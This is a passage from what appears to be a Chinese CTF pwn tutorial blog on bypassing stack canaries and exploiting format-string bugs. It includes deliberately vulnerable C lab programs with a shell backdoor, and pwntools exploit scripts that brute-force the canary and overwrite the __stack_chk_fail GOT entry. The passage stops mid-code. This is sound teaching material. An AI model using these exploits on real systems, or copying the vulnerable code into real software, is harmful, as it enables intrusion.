title="原理"></a>原理</h3><p>对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的。one by one爆破思想是利用<code>fork</code>函数来不断逐字节泄露。这里介绍一下fork函数，<strong>fork函数作用是通过系统调用创建一个与原来进程几乎完全相同的进程，这里的相同也包括canary</strong>。<font color="red">当程序存在fork函数并触发canary时，__ stack_chk_fail函数<strong>只能关闭fork函数所建立的进程，不会让主进程退出</strong></font>，所以当存在大量调用fork函数时，我们可以利用它来一字节一字节的泄露，所以叫做one by one爆破。</p><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>测试代码（上个测试代码稍微修改：</p><ul><li>这道题有fork函数，会循环创建子进程</li><li>没有了printf输出函数</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc -m32 -fstack-protector -o one_by_one one_by_one.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello Hacker!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time <span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./one_by_one"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./one_by_one"</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token string">"Find %d"</span> <span class="token operator">%</span> k<span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#print "Check %d for %d" % (b, k)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> canary <span class="token operator">+</span> p8<span class="token punctuation">(</span>b<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Hacker!\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>res <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">'stack smashing detected'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token string">'the %d is %d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>k<span class="token punctuation">,</span> b<span class="token punctuation">)</span>canary <span class="token operator">+=</span> p8<span class="token punctuation">(</span>b<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token keyword">break</span> <span class="token keyword">print</span> <span class="token string">'canary: %s'</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/09/canary/6.png"></p><h2 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>在开启canary保护的程序中，如果canary不对，程序会转到**__stack_chk_fail函数执行**。__stack_chk_fail函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。</p><h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p>测试代码：</p><ul><li>程序存在格式化字符串漏洞，且有后门函数</li><li>这里只有一次read–printf机会，所以不能leak canary后再攻击</li><li>利用格式化字符串漏洞任意地址写，将__stack_chk_fail的got表项内容替换为getshell函数地址</li><li>触发Canary，执行__stack_chk_fail ==&gt; getshell</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// gcc -m32 stack_chk_fail.c -o stack_chk_fail</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./stack_chk_fail"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./stack_chk_fail"</span><span class="token punctuation">)</span><span class="token comment">#格式化字符串地址相对于格式化字符串的偏移为10</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="数组下标越界绕过Canary"><a href="#数组下标越界绕过Canary" class="headerlink" title="数组下标越界绕过Canary"></a>数组下标越界绕过Canary</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>当程序中存在数组，没有对边界进行检查时，如果我们可以对数组进行对应位置修改，我们就可以绕过canary检测，直接修改返回地址。所以如果可以对arr数组任意位置进行修改，这就存在数组下标溢出。</p><p>以下图为例，数组大小为3，但是没有对数组的下标进行检查，这时返回地址就相当于arr[5]，如果我们对arr[5]进行修改就是对返回地址进行修改。</p><p><img src="/2023/04/09/canary/0.png"></p><h2 id="覆盖-TLS-中储存的-Canary-值-（具体见Canary-TLS-Blog"><a href="#覆盖-TLS-中储存的-Canary-值-（具体见Canary-TLS-Blog" class="headerlink" title="覆盖 TLS 中储存的 Canary 值 （具体见Canary-TLS Blog"></a>覆盖 TLS 中储存的 Canary 值 （具体见Canary-TLS Blog</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p><strong>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。（一般是针对子线程</strong></p><p>如果我们溢出的足够大，大到能够覆盖到fs/gs寄存器对应偏移位的值，我们就可以修改canary为我们设计好的值，这样在程序检测时就会和我们匹配的值进行检测，从而绕过canary保护。在初始化canary时，<strong>fs寄存器指向的位置是TLS结构体</strong>，而fs指向的位置加上0x28偏移的位置取出来的canary就在TLS结构体里面。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canary绕过与利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串</title>
      <link href="/2023/04/08/ge-shi-hua-zi-fu-chuan/"/>
      <url>/2023/04/08/ge-shi-hua-zi-fu-chuan/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><h4 id="格式化字符串-函数"><a href="#格式化字符串-函数" class="headerlink" title="格式化字符串(函数"></a>格式化字符串(函数</h4><p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。一般来说，格式化字符串在利用的时候主要分为以下三个部分：</p><ul><li>格式化字符串函数</li><li>格式化字符串</li><li>后续参数，<strong>可选(就是相应的要输出的变量</strong></li></ul><p><strong>格式化字符串</strong>基本格式：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">%</span><span class="token punctuation">[</span>parameter<span class="token punctuation">]</span><span class="token punctuation">[</span>flags<span class="token punctuation">]</span><span class="token punctuation">[</span>field width<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">.</span>precision<span class="token punctuation">]</span><span class="token punctuation">[</span>length<span class="token punctuation">]</span>type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>parameter<ul><li><font color="red">n$，获取格式化字符串中的指定参数</font>(n为参数列表中的第几个参数)</li></ul></li><li>field width<ul><li>输出的最小宽度</li></ul></li><li>precision<ul><li>输出的最大长度</li></ul></li><li>length，输出的长度<ul><li><font color="red">hh，输出一个字节</font></li><li><font color="red">h，输出一个双字节</font></li></ul></li><li>type<ul><li><font color="red">n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</font></li><li>%， ‘<code>%</code>‘字面值，不接受任何 flags, width。</li></ul></li></ul><h4 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h4><p>格式化字符串函数是根据格式化字符串来进行解析的。**那么相应的<font color="red">要被解析的参数的个数由这个格式化字符串所控制</font>**。比如说’%s’表明我们会输出一个字符串参数。</p><p>eg：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">float</span> b <span class="token operator">=</span> <span class="token number">3.14</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> <span class="token string">"hello world!"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = %d, b = %lf, c = %s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在调用printf前栈中的分布(x86)：</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/1.png"></p><p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p><ul><li>当前字符不是 %，直接输出到相应标准输出。</li><li>当前字符是 %， 继续读取下一个字符<ul><li>如果没有字符，报错</li><li>如果下一个字符是 %, 输出 %</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p>我们把代码修改为如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = %d, b = %lf, c = %s\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时栈中的分布如下：</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/2.png"></p><p>此时我们可以发现<strong>我们并没有提供参数</strong>，那么程序会如何运行呢？程序照样会运行，<strong>会将栈上存储格式化字符串地址上面的三个变量分别解析为：</strong></p><ol><li>解析其内容对应的整形值</li><li>解析其内容对应的浮点值</li><li>解析其地址对应的字符串</li></ol><p>对于 1，2 来说倒还无妨，但是对于 3 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/3.png"></p><p>这里给大家出个小问题：请问下面这段代码的输出结果是什么？？</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">float</span> b <span class="token operator">=</span> <span class="token number">3.14</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> <span class="token string">"hello world!"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = %d, b = %lf, c = %s, x = %d, %n x = %d\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> s<span class="token punctuation">,</span> x<span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"x = %d\n"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/4.png"></p><p>为什么第一个printf输出的x都是200呢？而下面是49呢？请自行查看在调用printf函数之前的栈分布。</p><h3 id="格式化字符串漏洞的利用"><a href="#格式化字符串漏洞的利用" class="headerlink" title="格式化字符串漏洞的利用"></a>格式化字符串漏洞的利用</h3><h4 id="泄漏内存"><a href="#泄漏内存" class="headerlink" title="泄漏内存"></a>泄漏内存</h4><ul><li>泄露栈内存<ul><li>获取某个变量的值</li><li>获取某个变量对应地址的内存</li></ul></li><li>泄露任意地址内存<ul><li>利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址</li><li>盲打，dump 整个程序，获取有用信息。</li></ul></li></ul><h5 id="泄漏栈内存"><a href="#泄漏栈内存" class="headerlink" title="泄漏栈内存"></a>泄漏栈内存</h5><h6 id="获取栈变量的值"><a href="#获取栈变量的值" class="headerlink" title="获取栈变量的值"></a>获取栈变量的值</h6><p>这里给出wiki上的例子：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们输入%p-%p-%p</p><ul><li>程序断在第一个printf处</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">此时栈分布为：返回地址格式化字符串 <span class="token operator">=</span> <span class="token string">"%08x.%08x.%08x.%s\n"</span>参数<span class="token number">1</span> <span class="token operator">=</span> <span class="token number">0x1</span>参数<span class="token number">2</span> <span class="token operator">=</span> <span class="token number">0x22222222</span>参数<span class="token number">3</span> <span class="token operator">=</span> <span class="token number">0xffffffff</span>参数<span class="token number">4</span> <span class="token operator">=</span> address of <span class="token char">'%p-%p-%p'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/5.png"></p><ul><li>程序断在第二个printf处</li></ul><pre class="line-numbers language-none"><code class="language-none">此时栈分布：返回地址格式化字符串 = "%p-%p-%p"0xffffd0080xf7ffd9180xf0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意我这里并没有说成参数，但是当解析格式字符串时，会把栈中的值按照类型进行解析并输出，所以输出为<code>0xffffd008-0xf7ffd918-0xf0</code>。这里其实就泄漏了栈地址。</p><p>note：并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为<strong>栈是不对内存页做初始化</strong>。</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/6.png"></p><p><strong>需要注意的是，上面给出的方法，都是依次获得栈中的每个参数，我们可以直接获取栈中被视为第 n+1 个参数的值：<code>%n$x</code></strong> – <font color="red">n针对的是格式化字符串的参数</font></p><ul><li><strong>注意区别<font color="red">格式化字符串</font>的参数与<font color="red">格式化字符串函数</font>的参数</strong></li></ul><p>如输入<code>%6$p</code></p><ul><li>可以看到我们打印出了printf的第7个参数，格式化字符串的第6个参数</li></ul><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/7.png"></p><h6 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h6><p>利用<code>%s</code>可以获取栈变量对应字符串 ，<strong>但是，不是所有<code>%s</code>都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</strong></p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/8.png"></p><p>小总结：</p><ol><li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li><li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li><li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</li></ol><h5 id="泄漏任意地址内存"><a href="#泄漏任意地址内存" class="headerlink" title="泄漏任意地址内存"></a>泄漏任意地址内存</h5><p>一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，<strong>第一个参数的值其实就是该格式化字符串的地址。</strong></p><p>可以看出在栈上的第二个变量就是我们的格式化字符串地址 0xffffcfe0，同时该地址存储的也确实是<code>'%s'</code>格式化字符串内容。</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/9.png"></p><p>那么由于我们可以控制该格式化字符串，如果我们知道该<strong>格式化字符串在输出函数调用时是第几个参数</strong>，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">addr<span class="token operator">%</span>k$s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注： 在这里，如果格式化字符串在栈上，那么我们就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址 8 字节或者 16 字节。</p></blockquote><p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">[</span>tag<span class="token punctuation">]</span><span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一般来说，我们会<strong>重复某个字符的机器字长来作为 tag，而后面会跟上若干个 %p</strong> 来输出栈上的内容，如果<strong>内容与我们前面的 tag 重复了</strong>，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其他字符进行尝试，进行再次确认。这里我们利用字符’A’作为特定字符，同时还是利用之前编译好的程序，只是加了个<code>puts</code>函数如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token 